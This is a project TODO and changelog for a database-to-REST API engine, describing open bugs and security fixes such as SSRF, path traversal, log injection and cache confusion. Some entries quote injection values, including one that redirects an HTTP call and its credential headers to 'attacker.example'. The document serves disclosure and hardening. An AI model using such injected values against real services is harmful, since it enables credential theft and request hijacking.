# TODO

Follow-ups recommended after a change landed, so they are not lost between releases. Each item
names the note that explains the background.

## Open

- **Opt-in `<allowed_hosts>` for embedded HTTP calls.** The 1.6.0 escaping fix stops a *caller*
  from steering an `{http{ … }http}` block to another host, but a configuration author is still
  trusted to pick any host and there is no private-range block. An opt-in allow-list of
  destination hosts (global, overridable per endpoint) would close that. Background:
  [SECURITY_HARDENING_1.6.md](SECURITY_HARDENING_1.6.md), section 1, "Not done, and why".

The items below were found on 2026-10-06 while testing the docs with docs-only agents graded
against the code. Each was read in the code; none has a test yet.

- **Custom SQL errors don't map on every database** (ApiController.cs, `TryGetCustomDbError`):
  - PostgreSQL messages keep the `P0001:` SQLSTATE prefix (use `MessageText`).
  - Oracle expects a negative `Number`, but ODP.NET reports a positive one.
  - DB2 takes the first `[nnnnn]` in the message, which is the SQLSTATE.
  - ODBC and OleDb have no branch.
  - SQLite can raise only inside a trigger: consider registering a function such as `throw_http(404, 'msg')`.
  - SQL Server `RAISERROR('text', 16, 1)` reports 50000, which becomes status 0.
- **Unmapped database errors return 400** (ApiController.cs, `BadRequest` with the generic
  message). A timeout or an unreachable database looks like a client error. Consider 500.
- **`<cache>` on a file download route breaks the download.** `CachableQueryResult` only
  handles `ObjectResult`, so the file result is replaced and its stream leaks.
- **Rollback with `overwrite_existing_files` deletes the overwritten file**, so a failed request
  destroys the previous content instead of restoring it.
- **A write that fails part-way leaves a partial file.** Step7 records a path for rollback only
  after its copy or upload completes. Record it before, or delete the destination in the catch.
- **Silent upload and download misconfigurations.** Each of these returns success, or a 404 at
  request time, with nothing stored or served:
  - an upload route without `files_json_field_or_form_field_name`;
  - no `stores`, or only unknown store names;
  - a local store without `base_path`, or an SFTP store missing credentials;
  - a second `<local_file_store>` or `<sftp_file_store>` element in one file, which numbers the
    siblings so that no store name matches;
  - a download route without `<store>`, or with an unknown one.
  Warn at start-up, as `InertApiKeysWarning` does for API keys.
- **An `application/json` body that isn't valid JSON is read as no parameters** (every
  parameter NULL) instead of being refused with 400.
- **Step8 small bugs:** the `response_type` fallback reads `file_management:file_management:response_type`,
  and the `regex:file_variables_pattern` lookup discards its result.
- **OpenAPI:** upload endpoints have no request schema, and the default error schema
  (`error_message`) doesn't match the runtime body (`success`, `message`, `error_number`).
- **The shipped `settings.xml` sets `debug_mode_header_value` to 54321.** Anyone sending that header
  gets stack traces. Ship the sample without the element (an empty value is "off" from 1.7.6).
- **Configuration reload, reported by review and not yet reproduced end to end:**
  - The route resolvers and `SettingsEncryptionService` subscribe to the same root reload token. On
    alternate reloads the resolvers may rebuild from the previous merged snapshot.
  - On Linux and macOS without `settings_encryption:data_protection_key_path`,
    `SettingsEncryptionService` returns before it registers its change token, so nothing would
    hot-reload.
  - A connection's provider is cached for the life of the process (`DbConnectionFactory`), so
    changing it needs a restart.
- **`max_payload_size_in_bytes` configures Kestrel only.** Under IIS in-process hosting (the
  default), ASP.NET Core's `IISServerOptions.MaxRequestBodySize` (30,000,000 bytes) applies
  instead, and IIS's `maxAllowedContentLength` before it. The engine could set
  `IISServerOptions.MaxRequestBodySize` from the same setting. `maxAllowedContentLength` still
  needs a `web.config`.
- **A constant subject gives every user the same `user_id`.** An Azure AD B2C user flow with the
  subject claim turned off sends `Not supported`. Ignore that value and fall back to `oid` (the
  fallback to the renamed `oid` itself works from 1.7.6).
- **Only the config files listed in `DBToRestAPI.csproj` are copied to the build output.** A new
  `config/*.xml` file named in `<additional_configurations>` makes `dotnet run` fail at start-up
  until it gets its own csproj entry. Consider a `config\*.xml` glob.
- **Download `http` source:** no host allow-list.
- **A cookie set on a redirect is dropped.** The engine's clients are pooled and keep no cookies, so
  that callers never share them, and they follow redirects themselves. So a cookie the remote sets on
  a `3xx` never reaches the next hop: an `http` download that needs it fails (until 1.7.8 each
  download had a client of its own, whose cookies lived for that download only), and a gateway cookie
  login that answers `302` with the session cookie can't work. `{http{}}` calls can turn off `follow_redirects` and make the
  second call. Fixes: follow redirects in the engine with a cookie jar per request; for the gateway,
  pass the `3xx` through, which needs its `Location` rewritten to the gateway route, or the caller
  would follow it straight to the target.
- **CORS:** the engine sends no `Access-Control-Expose-Headers`, so cross-origin pages can't read
  `Content-Disposition` on downloads.
- **A URL-shaped `Origin` the server can't send back is a 500 on every request.** When the CORS
  pattern matches the host of an `Origin` such as `http://localhost/café`, the engine echoes the
  header as sent in `Access-Control-Allow-Origin`, and Kestrel refuses the non-ASCII value: an
  unhandled exception, an Error entry, a 500. Echo only the serialized origin (scheme, host, port).
- **An upload's file name can reach the log with U+2028 or U+2029.** The upload rejection line
  (Debug) and Step7's path lines replace control characters only. Use `LogText.Escape`.
- **Database error messages are logged as the driver wrote them.** The controller's catch-all and
  Step6 log the exception at Error, and some drivers repeat a caller's value in the message (SQLite's
  bad JSON path, a SQL Server conversion error), so a caller can put control characters into the log.
  Escape the message, or log the exception type and number only.
The items below were found on 2026-10-06 by checking real-world usage patterns against the code.

- **A caller waiting on another caller's cache fill gets a 400 when that caller disconnects.**
  HybridCache runs one fill per key and every caller with the same key waits on it, but the fill
  uses the first caller's `RequestAborted` (and, for a query endpoint, a connection registered for
  disposal on the first caller's response). When that caller leaves, the fill fails and every
  waiting caller gets the generic 400. Fix it by giving the fill HybridCache's own `cancel` token
  (cancelled only when every caller has gone) plus the route's timeout, and by disposing the
  connection inside the factory in materialised mode. Don't catch OperationCanceledException in
  the callers instead: a 1.7.6 attempt did, and also caught upstream timeouts, so every waiting
  caller re-sent its request to an upstream that was already too slow. Found by review on
  2026-10-06.
- **An error after part of a streamed result has been written cuts the connection.** Results
  of two or more rows (other than a file download's or a count query's count) stream their rows, so an error raised after the rows (from 1.7.7
  it surfaces) can't change a status that MVC has already handed to the server: Step6 aborts the
  connection. That happens after about 4 KB of short values, or much sooner with long text. To
  keep the status for small and medium results, buffer a streamed result up to a configurable
  size before writing it, and stream only beyond that. Found by review on 2026-10-07.
- **OpenAPI doesn't show a `root_node` wrapper,** and documents a file route that also has a
  `count_query` as a download, though it answers the count wrapper. Found by review on 2026-10-07.
- **Cache invalidators are read from every parameter source** (CacheService.cs), so one named like
  a `<vars>` key or a JWT claim takes that value. Also consider a start-up warning for a cached
  route whose answer looks caller-specific (it uses `{auth{...}}` without naming the caller in
  `<invalidators>`).
- **`{http{}}` matching ignores SQL comments.** A complete marker in a comment makes a real call.
  An unclosed one pairs with the next block's `}http}`, and the SQL in between is deleted.
- **JSON numbers are bound as `double`** (Com.H.Data.Common `DataExtensions`). On SQL Server, a
  number declared `NVARCHAR` becomes text with 6 significant digits. Consider binding integral and
  exact numbers as `decimal`.
- **No configuration validation at load:**
  - an element name repeated across files merges both endpoints silently;
  - a repeated verb + route resolves to the first match silently;
  - unknown tags (for example `<cache_duration_seconds>`) are ignored.
- **Regex override keys are read inconsistently.** The shipped `regex.xml` sets
  `regex:query_string_variables_pattern`, `regex:route_variables_pattern` and
  `regex:form_variables_pattern`, which the code never reads. Its comments and tutorials 06 and 07
  also say a `<query>` attribute (`variables_pattern` and the like) overrides a pattern; the code reads
  only the endpoint's own elements, then the `regex:` keys.
- **`PATCH` is accepted by routing, CORS and OpenAPI, but `ApiController` has no `[HttpPatch]`**,
  so a PATCH probably ends in 405. Not run-tested.
- **A body with another content type** (`text/plain`, `application/*+json`) gives `NULL` for every
  body parameter and a success, never `415`. The `json/` route prefix is the only workaround, and
  it is undocumented.
- **CORS:** when any `<authorize>` section exists, credentials are on for every route and the
  default allowed headers leave out `X-Auth-Provider`.
- **Docs: finish the agent-first rewrite** ([docs/AUTHORING.md](docs/AUTHORING.md)).
  Uploads, downloads and errors are done, and the `{auth{sub}}` examples, query chaining's error
  format and the parameter priority order were corrected. Still to do:
  - 02-configuration, which shows endpoints without `<queries>`;
  - tutorials 02, 05, 07, 08 and 09, which show error bodies as `{"error": ...}`;
  - 03-crud's `204` example with `OUTPUT`, which can't write a body;
  - tutorial 23's broken links;
  - `MULTI_QUERY_CHAINING.md` (a root design note that README and tutorial 23 link as a deep dive),
    which reads earlier queries' columns with `{{column}}` instead of `{pq{column}}`;
  - tutorial 19, which puts a caller's value inside an `{http{}}` `"url"` string (AGENTS rule 11) and
    says a `{s{}}` value in a block is "injected as a parameterized SQL variable";
  - tutorial 17's contact-permissions example, whose `FOR JSON` column needs
    `AS {type{json{permissions}}}` to come back as the nested array the page shows;
  - topic 08 and tutorial 12: an empty route `<excluded_headers>` counts as not set, so the global
    list applies;
  - topic 17's and tutorial 19's form-encoded bodies built from raw caller values (`&` and `=` in a
    value are structural there, as in a url): use `body_raw` with a content type, and encode or check
    the values in an earlier chained query;
  - 11-cors, whose defaults change when an `<authorize>` section exists;
  - the webhook pages' status-polling endpoints, which are public and use sequential ids;
  - `RateLimitCallerIdentity.cs`'s comment about an `oid` fallback that never matches.
  Then add `docs/reference/tags.md` and `placeholders.md`, examples tested in CI, and docs
  bundled in release archives.

## Done

- **The sample `settings.xml` set a global `db_command_timeout` of 30 seconds.** Changed in 1.7.9.
  Because it was always set, every query got a command timeout of 30 seconds, which overrode any
  timeout in a connection string (`Command Timeout=120` for SQL Server). It is now a commented-out
  example, so a query without its own timeout uses its connection string's, or the provider's default.
- **A name used both in a block's JSON comment and outside a string was not escaped in the comment.**
  Fixed in 1.7.9. Markers in a comment, and markers that start inside another marker, were skipped
  when the engine worked out where each name sits, so a name also used outside strings counted as
  outside-only and got its JSON value unescaped everywhere. A caller's `*/ } //` then closed the
  comment and the block, and the block's keys after the comment (a `skip`, say) were dropped. Such a
  name now counts as inside a string, as topic 17 says: it is escaped everywhere and a warning is logged.
- **A comment or a trailing comma in an `{http{}}` block made the engine ignore its `skip` and
  `no_wait`.** Fixed in 1.7.9. The call itself was read leniently, but those two properties were read
  strictly, so a parse failure counted as false: a call the author meant to skip went out, and a
  `no_wait` call was waited for. Both are read like the call now.
- **Caller text was logged as sent in four more places.** Fixed in 1.7.9. An unvalidated token's
  issuer that matched none of a route's providers (Debug), a provider hint header that names no allowed
  provider (Warning), a header name the gateway can't forward (Warning), and the `Origin` header the CORS
  check reads (an `Origin` that isn't a URL was an Error entry with a stack trace on every request). The
  server accepts a vertical tab, ESC and U+2028 in a header, so a caller could break a log line or send
  terminal codes. All four go through `LogText.Escape` now, and a malformed `Origin` is logged at Debug.
- **A file or count query that returns several rows loses an error raised after them.** Kept by
  design (decided 2026-10-10). The engine takes their first row by reading two, and closing the reader
  discards the rest of the batch, the error included. Such a query should return one row; reading a
  wrong one to its end would spend the memory and time the 512 MB, 1 vCPU footprint can't spare.
  AGENTS.md rule 2 and errors.md state the exception.
- **One `<path>` under `<additional_configurations>` was never loaded.** Fixed in 1.7.9. The XML reader
  gives a single element as a value of its own and numbers only repeated ones, and the engine read the
  list as numbered children only. So a `settings.xml` listing one file started without it (and its
  endpoints), and its encrypted sections weren't encrypted. Both shapes are read now, so a single
  listed file that is missing now stops start-up, as it already did when several were listed.
- **The TLS walkthrough ran the engine as Development.** Fixed in 1.7.9. Step 5's `dotnet run
  --environment Production` doesn't reach the engine with the .NET 10 SDK, so the launch profile's
  `Development` stayed in force and `appsettings.Production.json` was never read. The page now says
  `dotnet run -- --environment Production`.
- **The request's route was logged as decoded.** Fixed in 1.7.9. A `%0A` in the path put a line break
  into every log line that names the route. Step1 now stores it with control characters, the Unicode
  line separators and `%` percent-encoded (`LogText.Escape`), so it stays on one line and two paths
  never look alike.
- **The gateway docs and the shipped `settings.xml` named settings the engine never reads.** Fixed in
  1.7.9. Topic 08 showed `<n>` for `<name>` in `<applied_headers>` and `<ignore_certificate_errors>`
  for `<ignore_target_route_certificate_errors>`; tutorial 12 and `settings.xml` used
  `<headers_to_exclude_from_routing>` and `<ignore_certificate_errors_when_routing>` for the global
  `<excluded_headers>` and `<ignore_target_route_certificate_errors>`, and said a route's list adds to
  the global one (it replaces it). The shipped `settings.xml` now sets the global `excluded_headers` to
  `Host`, as it meant to. Two `<header>` elements in `<applied_headers>` also applied neither header,
  because the configuration reader numbers repeated siblings; each is applied now.
- **With the header and query-string patterns overridden to one string, a header beat the body.** Fixed
  in 1.7.9 by Com.H.Data.Common 10.1.0.12. Sources with the exact same pattern string were read together
  in the place of the last of them, so the headers moved past the body. The body, listed between them,
  now keeps its place.
- **A value from an earlier query could pull a setting into an `{http{}}` call.** Fixed in 1.7.9 by
  Com.H.Data.Common 10.1.0.12. The block was filled one source at a time, and each source read the
  values written in before it. So a `{s{name}}` or `{{name}}` marker inside a value an earlier query
  returned (a caller's field it passed through, say) was filled too, and a caller could send a
  `<vars>` value to the call's target. Values are now written in as they are. One name under two
  markers of one pattern in a block (`{{id}}` and `{j{id}}`) also gets its value at both; only the
  first one found used to be filled, and the other, depending on their order, was left as written,
  emptied, or filled from a lower-ranked source.
- **A skipped or `no_wait` `{http{}}` call could get another query's response.** Fixed in 1.7.9. Each
  query of a chain, and the main query after a `count_query`, numbered its calls from 1, and every
  query's responses were read with one marker pattern. So a skipped or `no_wait` call in a later
  query got the response of the earlier query's call with the same number instead of `NULL`. Calls
  are now numbered across the request.
- **Some input names made the query fail, or bound the wrong value.** Fixed in 1.7.9 by
  Com.H.Data.Common 10.1.0.11. The generated parameter name kept `@` and characters outside ASCII,
  which SQLite (`@`) and SQL Server (`€`, `°`, typographic quotes) reject, and two markers could get
  the same name: `{{first name}}` with `{{first-name}}`, `{{Email}}` with `{{email}}` on SQL Server,
  and `{{email}}` with `{j{email}}`. SQL Server and SQLite refused such a query. PostgreSQL ran it,
  and both placeholders got the first one's value, so rows written that way may hold the wrong one.
  Generated names now hold only ASCII letters, digits and underscores and are unique ignoring case.
- **A download's `http` URL reached the caller.** Fixed in 1.7.9. The `http` source's error
  messages held the full URL, a signed query string included. The caller's message no longer names
  it. No log line in the engine shows a URL's query string, fragment or user info any more: the
  download lines, the `{http{}}` lines (which also wrote a key in the url string at Information on
  every successful call, now at Debug) and the prepared-call Debug line (which held the whole filled
  JSON, headers included, and now holds its length), and the OIDC lines naming the authority and the
  key-set URL. A value that isn't an http or https URL is
  logged as `(not a network URL)`: .NET reads `//host/a?k=`, `/a?k=` (Linux), Windows paths and ftp
  URLs with `?` as an ordinary character. The executor's Debug request line names headers without
  their values; its pattern-based redaction missed names like `Ocp-Apim-Subscription-Key`.
- **The gateway and `{http{}}` calls shared cookies between callers.** Fixed in 1.7.9. Their pooled
  handlers kept a cookie jar, so a `Set-Cookie` from the target while serving one caller went out with
  the next caller's request, merged into a gateway caller's own `Cookie` header. No engine client keeps
  cookies now. A cached gateway route also stored the target's `Set-Cookie` and replayed it to every
  caller; a response with a `Set-Cookie` is no longer cached.
- **The configuration sources were read out of the documented order.** Fixed in 1.7.9.
  `appsettings.json` was added again after `settings.xml`, so it beat `settings.xml`, the environment
  file and command-line arguments, and its `Debug` level beat `appsettings.Production.json`'s
  `Information`. It is now the lowest layer, command-line arguments the highest, and the shipped level
  is `Information`.
- **A key in an encrypted section ignored environment variables and command-line arguments.** Fixed
  in 1.7.9. The encryption service laid the values it decrypted from the XML files over every source,
  so a `ConnectionStrings__default` environment variable lost to an encrypted `<default>`. It now
  decrypts only encrypted text, an override written in encrypted form included.
- **The HTTPS start-up check looked for the certificate beside the executable.** Fixed in 1.7.9.
  Kestrel loads a relative `Kestrel:Endpoints:Https:Certificate:Path` from the working directory, so
  `dotnet run` with the certificate in the project's `config/certs` (the TLS walkthrough) skipped
  HTTPS, and a release started elsewhere with the certificate beside the executable failed to start.
  The check now looks where Kestrel does, and its warning names the full path.
- **A failed OIDC discovery or key-set fetch logged the whole URL.** Fixed in 1.7.9. IdentityModel's
  exception message holds the address with its query string (an Azure AD B2C `?p=` policy); the
  engine now rethrows it with the address as the URL rule logs it.
- **Every GET threw and caught a JsonException.** Fixed in 1.7.9. A request without a Content-Type
  counts as JSON, so its empty body was parsed. The parse is skipped when the server knows there is no
  body.
- **OIDC signing keys were fetched twice per discovery, through a static HttpClient, and http
  downloads opened a new HttpClient each.** Fixed in 1.7.9: both use pooled IHttpClientFactory
  clients, which the tests answer in process. A download's client no longer keeps the cookies a
  redirect sets for its next hop (see Open). The key set is parsed before it is cached, so a
  provider's maintenance page or an empty key set is fetched again on the next request instead of
  breaking sign-in for the cache's 24 hours.
- **A name with a space couldn't be listed in `mandatory_parameters`.** The list was split on
  spaces too, so `first name` required `first` and `name`. Fixed in 1.7.8: commas and line breaks
  separate names, or `|` and line breaks when the list contains a `|` (for names with commas). The
  OpenAPI builder now splits the list the same way, and the missing-parameters message joins names
  with the list's separator. Cache `<invalidators>` use the same split, except that a name with a
  comma, a space or `;` stays whole only when one of the route's queries uses it in a marker;
  otherwise it is split on them as before, so an old list keeps every input in the key. Gateway
  routes run no query, so their names are always split that way.
- **The OpenAPI schema of a route without `response_structure` said it was always an array.** From
  1.7.8 it is one object or an array of them (`anyOf`); a `single` route, which showed the object
  alone, gets the same.
- **`single`, file and count-query results were read to their end.** 1.7.7 read every row of them
  to surface an error raised after the rows, building an object for each, so a 3,000,000-row
  SQLite `single` went from 0.02 s to 2.7 s. Fixed in 1.7.8: `single` is read as the default
  shape (it was mostly set on queries that return one row anyway, and logs a warning), and file
  and count queries take their first row by reading two.
- **A global `<response_structure>` under `<settings>` was half-supported.** The controller
  applied it to every route without its own tag, but it was undocumented and the file download
  middleware ignored it, so a store download that relied on a global `file` answered 404. Removed
  in 1.7.8: it is not read, the start-up log reports one that is still set, and `auto` (the only
  reason to write a tag for the default shape) is read as the tag left out, like `single`.
- **An error raised after the rows was lost.** Fixed in 1.7.7, with Com.H.Data.Common 10.1.0.10.
  The library closed the reader once the first result set's rows ran out, and closing discards an
  error raised after them (SQL Server's THROW after a SELECT, or a later statement that fails), so
  the request succeeded and its uploads were kept. 10.1.0.10 reads the batch to its end once every
  row has been read. The engine now reads `single`, file and count-query results to the end; reads
  the first two rows of `array` and count-query data inside the controller, as `auto` did; maps an
  error that surfaces while MVC streams a longer result in Step6 (the status the SQL asked for, or
  the generic 400) when nothing has been sent; and aborts the connection when something has, instead
  of ending a cut-off 200 (also when MVC has buffered part of the body without sending it, which
  used to give the error status with invalid JSON). With 10.1.0.10 a one-row chain result whose
  only column has no name is a bare value; the engine keeps it out of the `{{column}}` sources, so
  a JSON-object string there can't fill the next query's `{{name}}`. See
  [LateDbErrorTests.cs](DBToRestAPI.Tests/LateDbErrorTests.cs) and
  [PipelineTests.cs](DBToRestAPI.Tests/PipelineTests.cs).

- **A write to a cached endpoint was answered from the cache.** Fixed in 1.7.6. The key of a
  cached database endpoint was only its element name plus the `<invalidators>` values. An endpoint
  with no `<verb>` answers every verb, so a POST, PUT or DELETE got the cached GET response and its
  SQL never ran, while the caller saw a success. A route value missing from `<invalidators>`
  shared one entry across all ids. Now only GET and HEAD read or write the cache, on database
  endpoints and on API gateway routes (whose key never held the request body), and the key is the
  endpoint's configuration path, the verb, the hashed route values and the invalidators (the
  values, not the raw path, so `Items//1` and `items/1` share an entry). The gateway route is
  hashed in its key too, so a path carrying `|` or `=` can't build another request's key, and a
  repeated query value (`?tag=a&tag=b`) no longer shares the entry of `?tag=a,b`. Each invalidator
  value is labelled with its source, so `?category=toys` sent with a `category: books` header can't
  fill the books entry, and gateway query-string names keep their spelling. A gateway
  response whose status is in `exclude_status_codes_from_cache` used to be stored as an empty
  entry, so later requests got an empty 200 without being forwarded; it is no longer stored.
  See [CacheVerbAndRouteTests.cs](DBToRestAPI.Tests/CacheVerbAndRouteTests.cs).

- **A raw marker in an `{http{}}` block could take a request value and redirect the call.** Fixed in
  1.7.6. A marker outside a JSON string (`"body": {{payload}}`) was inserted as raw text. When a
  chained query's column was `NULL` (or it returned no row or several), a request field with the
  same name filled it, so `1, "url": "https://attacker.example"` added a second `url`, and the
  call went there with the block's credential headers. Now such a value must be exactly one JSON
  value (read as leniently as the block: comments and trailing commas allowed) and is inserted as
  compact JSON, or it is inserted as a JSON string. Booleans become `true`/`false` (their .NET text,
  `True`, was invalid JSON) and numbers use the invariant culture. Markers are found with the
  patterns the route actually uses, so an overridden delimiter such as `||id||` inside a string is
  escaped too. A marker used both inside and outside a string, in a comment, or brought in by an
  earlier value is escaped so it can't change the structure anywhere. See
  [EmbeddedHttpTemplateTests.cs](DBToRestAPI.Tests/HttpExecutor/EmbeddedHttpTemplateTests.cs).

- **Renamed token claims were missing, and `required_scopes` rejected `scp` tokens.** Fixed in
  1.7.6. .NET renames `sub`, `scp`, `oid`, `tid`, `given_name`, `family_name` and others on the way
  in. So `{auth{sub}}` and the other short names were empty, `required_scopes` gave every Entra ID
  or Okta token a 403, `user_id` never fell back to `oid`, and the UserInfo fallback ran for every
  new token because it looked for `given_name` under its short name only. The UserInfo values it
  added were `JsonElement`s that no SQL driver binds, so a query using one failed with the generic
  400. Now every claim is exposed under its .NET type and the name the token used, look-ups match
  either name, UserInfo values are text and never replace a claim the token has, and `user_id`,
  email, name, roles and scopes are read from the token before the UserInfo merge (so a B2C
  token's `emails` beats a UserInfo `email`). `{auth{scp}}` and `{auth{scope}}` hold every scope,
  space-separated, also when Okta sends them as an array. See
  [Step4ClaimNamesTests.cs](DBToRestAPI.Tests/Step4ClaimNamesTests.cs).

- **An empty `debug_mode_header_value` turned debug mode on for an empty header.** Fixed in 1.7.6.
  A missing or blank setting now means debug mode is off, and the header must match exactly. See
  [DebugModeTests.cs](DBToRestAPI.Tests/DebugModeTests.cs).

- **A caller could set the fields an upload entry gets from the engine.** Fixed in 1.7.5. A caller
  could hand the query a files array of their own, marked `is_new_upload` and pointing at any file
  in the store, so an update query that inserts new uploads would record a row for someone else's
  file. There were four ways in. The files field in a query string parameter or a header (both
  answer to the same `{{attachments}}`), or a second copy in the body in another case, replaced
  the array the engine built. An entry that brought no file (an existing file in a partial update)
  reached the query exactly as sent. A stored entry copied the caller's own fields after the
  engine's, so it could carry a second `relative_path` or `is_new_upload`. And a multipart part's
  `mime_type` was its own Content-Type header. Now the files field comes only from the body, once;
  an existing entry arrives without `relative_path`, `extension`, `mime_type`, `size`,
  `backend_temp_file_path`, `is_new_upload` or the content field, and the query matches it by `id`;
  a stored entry drops the caller's values for those names; and `mime_type` always comes from the
  file name. Upgrade note: a query copied from the old docs that inserts every entry should add
  `WHERE JSON_VALUE(value, '$.is_new_upload') = 'true'`, as the docs now do. A multipart upload
  with `pass_files_content_to_query` writes the content under the configured content field name,
  as a JSON upload does, instead of always `base64_content`. See
  [UploadEngineFieldsTests.cs](DBToRestAPI.Tests/UploadEngineFieldsTests.cs).

- **A route with `<api_keys>` instead of `<api_keys_collections>` was open without a word.** Fixed
  in 1.7.5. Only `<api_keys_collections>` protects a route and nothing reads a route's
  `<api_keys>`, so such a route answered callers without a key while reading as protected. The
  engine now logs a warning naming each such route, and each `<api_keys_collections>` that names
  no collection (keys pasted in from api_keys.xml, say), at start-up and when the configuration is
  reloaded. The API key and gateway docs say which tag protects a route. See
  [InertApiKeysWarning.cs](DBToRestAPI/Services/InertApiKeysWarning.cs).

- **Uploads could store something other than what was sent.** Fixed in 1.7.4. Base64 content
  without its trailing `=` padding lost its last one or two bytes (the streaming decoder dropped
  an incomplete last group), and two multipart parts with the same name were both stored with the
  first part's bytes. Unpadded base64 is now completed before decoding (a length no base64 can
  have is a 400), each multipart entry claims its own part in order, and a part no entry names is
  a 400 instead of being ignored. The decoder no longer uses FromBase64Transform, which could
  also throw (a 500) on valid content over 8 KB with whitespace near its chunk boundaries. The
  multipart path no longer swallows failures: a form that can't be read is a 400, and an
  unexpected failure is a logged 500 instead of a request that runs on without its files and
  reports success. A form content type with no body is still read as no parameters.
  See [UploadIntegrityTests.cs](DBToRestAPI.Tests/UploadIntegrityTests.cs).

- **An invalid upload returned an empty 500, or was silently dropped.** Fixed in 1.7.3. Upload
  validation errors (file name, extension, size, count, content that is not base64, metadata
  shape) escaped parameter building, so a JSON upload got an empty 500. The multipart path
  swallowed them, along with malformed metadata and a body over the size limit, so the request
  ran on with every form field null and could report success. They are now a
  `RequestValidationException`, which both paths let through and which becomes a 400 that says
  why. A body over `max_payload_size_in_bytes` is a 413 for JSON and forms alike, a form over a
  `FormOptions` limit is a 400, and anything else that fails while reading parameters is a JSON
  500 with the error code. See `ParametersBuilder.GetParamsOrErrorAsync` in
  [ParametersBuilder.cs](DBToRestAPI/Services/ParametersBuilder.cs).

- **Keep a download's `relative_path` inside its store.** Shipped in 1.7.2. Before, the path a
  download query returned was joined to the store's `base_path` unchecked, so `..`, an absolute
  path, or on Windows a UNC or device path (`\\host\share\...`, `\??\UNC\...`) read any file the
  app's account could reach, on that machine or another one. Local and SFTP stores now refuse
  anything outside `base_path` with the same 404 as a missing file, and neither 404 echoes the
  resolved path any more. A local store without a `base_path` no longer falls back to the app's
  own folder. The upload side got the same check, and on Linux a file name containing `\` can
  no longer turn into a path outside the store. See
  [FileStorePath.cs](DBToRestAPI/Services/FileStorePath.cs) and
  [docs/topics/10-file-downloads.md](docs/topics/10-file-downloads.md).

- **SFTP uploads failed for every new file.** Fixed in Com.H.Net.Ssh 10.1.1, which 1.7.2
  references. In 10.1.0, `SFtpClient.Exists` and `ExistsAsync` threw `SftpPathNotFoundException`
  for a missing path instead of returning false, so the existence check that runs before each
  SFTP upload (with the default `overwrite_existing_files=false`) failed on every new file.

- **OpenAPI `429` annotation for rate-limited operations.** Shipped in 1.7.0 together with the
  rate-limiting feature itself. See [docs/topics/18-rate-limiting.md](docs/topics/18-rate-limiting.md)
  and [docs/topics/20-openapi.md](docs/topics/20-openapi.md).
